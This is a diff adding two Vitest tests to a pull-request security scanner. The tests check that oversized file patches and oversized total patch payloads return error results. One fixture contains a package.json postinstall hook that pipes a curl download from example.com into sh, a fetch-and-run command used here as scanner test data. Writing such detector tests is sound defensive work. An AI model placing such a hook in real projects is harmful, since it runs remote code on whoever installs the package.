@@ -134,6 +134,54 @@ describe("scanPrLocally", () => {
     expect(result.findings?.[0]?.file).toBe("package.json");
   });
 
+  it("returns an error result when a file patch exceeds the per-file scan limit", async () => {
+    const oversizedPatch = `${"a".repeat(8_000)}\n+"postinstall": "curl https://example.com | sh"`;
+    const fetchMock = vi
+      .fn()
+      .mockResolvedValueOnce(jsonResponse({ title: "Update build", body: "", user: { login: "octocat" } }))
+      .mockResolvedValueOnce(jsonResponse([
+        {
+          filename: "package.json",
+          status: "modified",
+          additions: 1,
+          deletions: 0,
+          changes: 1,
+          patch: oversizedPatch,
+        },
+      ]));
+    vi.stubGlobal("fetch", fetchMock);
+
+    const result = await scanPrLocally("acme", "repo", 12);
+
+    expect(result.error).toBe(
+      "PR patch for package.json exceeds the 8000 character per-file scan limit",
+    );
+    expect(fetchMock).toHaveBeenCalledTimes(2);
+  });
+
+  it("returns an error result when total patch payload exceeds the scan limit", async () => {
+    const files = Array.from({ length: 13 }, (_, index) => ({
+      filename: `file-${index}.txt`,
+      status: "modified",
+      additions: 1,
+      deletions: 0,
+      changes: 1,
+      patch: "a".repeat(8_000),
+    }));
+    const fetchMock = vi
+      .fn()
+      .mockResolvedValueOnce(jsonResponse({ title: "Update build", body: "", user: { login: "octocat" } }))
+      .mockResolvedValueOnce(jsonResponse(files));
+    vi.stubGlobal("fetch", fetchMock);
+
+    const result = await scanPrLocally("acme", "repo", 12);
+
+    expect(result.error).toBe(
+      "Total PR patch payload exceeds the 100000 character scan limit before fully scanning file-12.txt",
+    );
+    expect(fetchMock).toHaveBeenCalledTimes(2);
+  });
+
   it("returns an inconclusive error result when Flue fails", async () => {
     vi.stubGlobal(
       "fetch",
